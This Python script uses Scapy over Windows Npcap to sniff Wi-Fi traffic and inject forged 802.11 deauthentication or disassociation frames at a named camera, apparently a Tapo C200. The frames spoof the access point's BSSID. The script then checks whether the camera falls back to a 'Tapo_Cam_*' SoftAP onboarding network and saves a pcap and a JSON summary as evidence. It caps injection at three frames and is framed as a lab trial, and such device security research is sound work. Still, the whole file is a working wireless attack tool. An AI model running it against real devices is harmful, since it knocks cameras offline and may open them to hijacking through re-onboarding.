#!/usr/bin/env python3
import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone

from scapy.all import (
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Disas,
    Dot11Elt,
    RadioTap,
    conf,
    sendp,
    sniff,
    wrpcap,
)


def norm_mac(value: str) -> str:
    return value.lower().replace("-", ":")


def resolve_iface(name: str):
    # Force Scapy to use Npcap/libpcap on Windows. This is the backend that can
    # expose Native Wi-Fi monitor captures with Radiotap when Npcap was installed
    # with raw 802.11 support.
    conf.use_pcap = True

    exact = []
    fuzzy = []
    needle = name.lower()
    for iface in conf.ifaces.values():
        fields = [
            str(getattr(iface, "name", "")),
            str(getattr(iface, "description", "")),
            str(getattr(iface, "network_name", "")),
            str(getattr(iface, "guid", "")),
        ]
        lowered = [x.lower() for x in fields if x]
        if needle in lowered:
            exact.append(iface)
        elif any(needle in x for x in lowered):
            fuzzy.append(iface)

    matches = exact or fuzzy
    if not matches:
        inventory = []
        for iface in conf.ifaces.values():
            inventory.append({
                "name": str(getattr(iface, "name", "")),
                "description": str(getattr(iface, "description", "")),
                "network_name": str(getattr(iface, "network_name", "")),
                "guid": str(getattr(iface, "guid", "")),
            })
        raise RuntimeError(
            f"Scapy/Npcap could not resolve interface {name!r}. Interfaces: "
            + json.dumps(inventory, ensure_ascii=False)
        )
    return matches[0]


def get_ssid(pkt):
    if not pkt.haslayer(Dot11Beacon):
        return None
    elt = pkt.getlayer(Dot11Elt)
    while elt is not None:
        if getattr(elt, "ID", None) == 0:
            raw = bytes(getattr(elt, "info", b""))
            return raw.decode("utf-8", errors="replace")
        elt = elt.payload.getlayer(Dot11Elt)
    return None


def camera_related(pkt, camera_mac: str):
    cam = norm_mac(camera_mac)
    for attr in ("addr1", "addr2", "addr3", "addr4"):
        value = getattr(pkt, attr, None)
        if value and norm_mac(value) == cam:
            return True
    ssid = get_ssid(pkt)
    return bool(ssid and ssid.startswith("Tapo_Cam"))


def build_frame(action: str, camera_mac: str, ap_bssid: str):
    dot11 = Dot11(
        type=0,
        addr1=norm_mac(camera_mac),
        addr2=norm_mac(ap_bssid),
        addr3=norm_mac(ap_bssid),
    )
    if action == "deauth":
        return RadioTap() / dot11 / Dot11Deauth(reason=3)
    if action == "disassoc":
        return RadioTap() / dot11 / Dot11Disas(reason=8)
    raise ValueError(f"unsupported action: {action}")


def main():
    parser = argparse.ArgumentParser(description="Bounded C200 S1 RF trial using Windows Npcap Native Wi-Fi")
    parser.add_argument("--interface", required=True)
    parser.add_argument("--camera-mac", required=True)
    parser.add_argument("--ap-bssid")
    parser.add_argument("--action", choices=["observe", "deauth", "disassoc"], required=True)
    parser.add_argument("--count", type=int, default=1)
    parser.add_argument("--observe-seconds", type=int, default=45)
    parser.add_argument("--out", required=True)
    args = parser.parse_args()

    if not 1 <= args.count <= 3:
        raise SystemExit("Refusing count outside 1..3; this lab intentionally forbids flood-style trials.")
    if not 10 <= args.observe_seconds <= 300:
        raise SystemExit("observe-seconds must be between 10 and 300")
    if args.action != "observe" and not args.ap_bssid:
        raise SystemExit("--ap-bssid is required for an injection trial")

    os.makedirs(args.out, exist_ok=True)
    iface = resolve_iface(args.interface)

    started = datetime.now(timezone.utc)
    injection = {
        "attempted": args.action != "observe",
        "ok": None,
        "error": None,
        "count": args.count if args.action != "observe" else 0,
    }

    frame = None
    if args.action != "observe":
        frame = build_frame(args.action, args.camera_mac, args.ap_bssid)

    def trigger():
        if frame is None:
            return
        try:
            # The PowerShell wrapper has already put the adapter into Native Wi-Fi
            # monitor mode. sendp uses the Npcap/libpcap L2 handle selected above.
            sendp(frame, iface=iface, count=args.count, inter=0.15, verbose=False)
            injection["ok"] = True
        except Exception as exc:
            injection["ok"] = False
            injection["error"] = f"{type(exc).__name__}: {exc}"

    print(f"[+] Scapy interface: {getattr(iface, 'name', iface)}")
    print(f"[+] Capturing for {args.observe_seconds}s; action={args.action}; bounded count={args.count}")

    packets = sniff(
        iface=iface,
        timeout=args.observe_seconds,
        store=True,
        started_callback=trigger,
    )

    kept = [pkt for pkt in packets if camera_related(pkt, args.camera_mac)]
    softaps = []
    camera_frames = 0
    radiotap_seen = False

    for pkt in packets:
        if pkt.haslayer(RadioTap):
            radiotap_seen = True
        ssid = get_ssid(pkt)
        if ssid and ssid.startswith("Tapo_Cam"):
            source = getattr(pkt, "addr2", None) or getattr(pkt, "addr3", None)
            key = {"ssid": ssid, "source": source}
            if key not in softaps:
                softaps.append(key)
        if camera_related(pkt, args.camera_mac):
            camera_frames += 1

    pcap_path = os.path.join(args.out, "radio-evidence.pcap")
    if kept:
        wrpcap(pcap_path, kept)
    else:
        # Keep evidence deterministic even when no target frame was observed.
        open(pcap_path, "wb").close()

    summary = {
        "started_utc": started.isoformat(),
        "finished_utc": datetime.now(timezone.utc).isoformat(),
        "platform": sys.platform,
        "interface_requested": args.interface,
        "interface_resolved": {
            "name": str(getattr(iface, "name", "")),
            "description": str(getattr(iface, "description", "")),
            "network_name": str(getattr(iface, "network_name", "")),
        },
        "camera_mac": norm_mac(args.camera_mac),
        "ap_bssid": norm_mac(args.ap_bssid) if args.ap_bssid else None,
        "action": args.action,
        "observe_seconds": args.observe_seconds,
        "injection": injection,
        "packets_seen": len(packets),
        "camera_or_softap_frames_kept": len(kept),
        "camera_related_frames": camera_frames,
        "radiotap_seen": radiotap_seen,
        "softap_seen": bool(softaps),
        "softaps": softaps,
    }

    if not radiotap_seen:
        summary["classification_hint"] = (
            "No Radiotap frame observed. Npcap raw 802.11 support may be disabled, "
            "the driver may not expose monitor captures, or the selected channel may be quiet/wrong."
        )
    elif softaps:
        summary["classification_hint"] = "Tapo_Cam_* beacon observed: investigate re-onboarding/SoftAP state."
    elif injection["attempted"] and injection["ok"] is False:
        summary["classification_hint"] = "Capture path worked, but Windows/Npcap/driver rejected raw L2 transmission."
    else:
        summary["classification_hint"] = "No Tapo_Cam_* beacon observed in this trial."

    with open(os.path.join(args.out, "summary.json"), "w", encoding="utf-8") as fh:
        json.dump(summary, fh, indent=2, ensure_ascii=False)

    print(json.dumps(summary, indent=2, ensure_ascii=False))
    return 0 if (args.action == "observe" or injection["ok"] is not False) else 3


if __name__ == "__main__":
    raise SystemExit(main())
